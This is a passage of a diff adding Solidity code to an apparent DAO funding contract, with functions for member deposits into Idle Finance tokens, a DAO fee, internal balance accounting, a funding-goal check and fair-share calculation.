+        return amount.mul(IIdleToken(idleToken).tokenPrice()).div(10**18);
+    }
+    
+    function subFees(address holder, uint256 amount) internal returns (uint256) {
+        uint256 poolFees = amount.div(uint256(100).div(10));
+        unsafeInternalTransfer(holder, daoFee, address(idleToken), poolFees);
+        return amount.sub(poolFees);
+    }
+    
+    function makeDeposit(uint256 amount) external nonReentrant {
+        require(members[msg.sender].exists == true, 'must be member to deposit shares');
+        
+        uint256 shares = amount.div(depositRate);
+        members[msg.sender].shares += shares;
+        require(members[msg.sender].shares <= partyGoal.div(depositRate).div(2), "can't take over 50% of the shares w/o a proposal");
+        totalShares += shares;
+        
+        require(IERC20(depositToken).transferFrom(msg.sender, address(this), amount), "token transfer failed");
+        depositToIdle(msg.sender, amount, shares);
+    }
+    
+    
+    function depositToIdle(address depositor, uint256 amount, uint256 shares) internal {
+        require(amount != 0, "no tokens to deposit");
+        totalDeposits += amount;
+        
+        // Token is the deposit token (eg. DAI)
+        require(IERC20(depositToken).approve(address(idleToken), amount), 'approval failed');
+        uint256 mintedTokens = IIdleToken(idleToken).mintIdleToken(amount, true, depositor);
+        
+        // Update internal accounting
+        members[depositor].iTB += mintedTokens;
+        members[depositor].iVal += amount;
+        unsafeAddToBalance(GUILD, idleToken, mintedTokens);
+        
+        // Checks to see if goal has been reached with this deposit
+         goalHit = checkGoal();
+        
+        // @Dev updates here b/c solidity doesn't recognize as a view only function
+        idleAvgCost = IIdleToken(idleToken).userAvgPrices(address(this));
+        
+        emit MakeDeposit(depositor, amount, mintedTokens, shares, goalHit);
+    }
+    
+    function checkGoal() public returns (uint8) {
+        uint256 daoFunds = getUserTokenBalance(GUILD, idleToken);
+        uint256 idleValue = getIdleValue(daoFunds);
+        
+        if(idleValue >= partyGoal){
+            return goalHit = 1;
+        } else {
+            return goalHit = 0;
+        }
+    }
+    
+    
+    function unsafeAddToBalance(address user, address token, uint256 amount) internal {
+        userTokenBalances[user][token] += amount;
+        userTokenBalances[TOTAL][token] += amount;
+    }
+
+    function unsafeSubtractFromBalance(address user, address token, uint256 amount) internal {
+        userTokenBalances[user][token] -= amount;
+        userTokenBalances[TOTAL][token] -= amount;
+    }
+
+    function unsafeInternalTransfer(address from, address to, address token, uint256 amount) internal {
+        unsafeSubtractFromBalance(from, token, amount);
+        unsafeAddToBalance(to, token, amount);
+    }
+
+    function fairShare(uint256 balance, uint256 shares, uint256 totalSharesAndLoot) internal pure returns (uint256) {
+        require(totalSharesAndLoot != 0);
+
+        if (balance == 0) { return 0; }
+
+        uint256 prod = balance * shares;
+
+        if (prod / balance == shares) { // no overflow in multiplication above?
+            return prod / totalSharesAndLoot;
+        }
+
+        return (balance / totalSharesAndLoot) * shares;
+    } 
 }
